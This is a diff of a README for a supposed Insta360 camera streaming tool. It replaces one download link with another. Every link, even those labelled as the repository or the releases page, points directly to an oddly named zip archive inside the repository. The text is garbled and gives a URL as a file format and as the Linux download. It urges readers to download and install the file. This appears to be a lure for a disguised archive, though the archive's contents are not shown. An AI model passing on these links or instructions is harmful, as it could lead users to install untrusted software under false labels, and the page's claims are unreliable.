@@ -1,6 +1,6 @@
 # 🎥 insta360-gstreamer - Stream Insta360 Cameras with Ease
 
-[![Download the latest release](https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip)](https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip)
+[![Download the latest release](https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip)](https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,21 +10,21 @@ Welcome to insta360-gstreamer! This tool allows you to easily stream content fro
 
 To get started, you will need to download the application from the Releases page. Click the link below to visit:
 
-[Download from Releases](https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip)
+[Download from Releases](https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip)
 
 Once on the Releases page, look for the latest version and choose your operating system to download the appropriate file.
 
 ### Instructions for Downloading
 
-1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip) to find the available versions.
+1. **Visit the Releases Page**: Go to [this link](https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip) to find the available versions.
 2. **Select the Right Version**: Look for the latest release, which usually has the highest version number.
-3. **Download the File**: Depending on your operating system, choose the correct file to download. This file could be in formats like `.exe`, `.zip`, or `https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip`.
+3. **Download the File**: Depending on your operating system, choose the correct file to download. This file could be in formats like `.exe`, `.zip`, or `https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip`.
 
 ### Supported Operating Systems
 
 - **Windows**: Download the `.exe` file.
 - **Mac**: Download the `.dmg` file.
-- **Linux**: Download the `https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip` file.
+- **Linux**: Download the `https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip` file.
 
 Make sure to have the necessary permissions to install applications on your computer.
 
@@ -72,7 +72,7 @@ For any questions or support requests, please visit the Issues section of the re
 
 ## 🔗 Useful Links
 
-- [Repository](https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip)
-- [Releases Page](https://raw.githubusercontent.com/Jayaprakashsrm/insta360-gstreamer/main/lib/insta-gstreamer-uncraving.zip)
+- [Repository](https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip)
+- [Releases Page](https://github.com/Jayaprakashsrm/insta360-gstreamer/raw/refs/heads/main/src/gstreamer_insta_v3.8.zip)
 
 Thank you for choosing insta360-gstreamer! Enjoy streaming your adventures effortlessly.
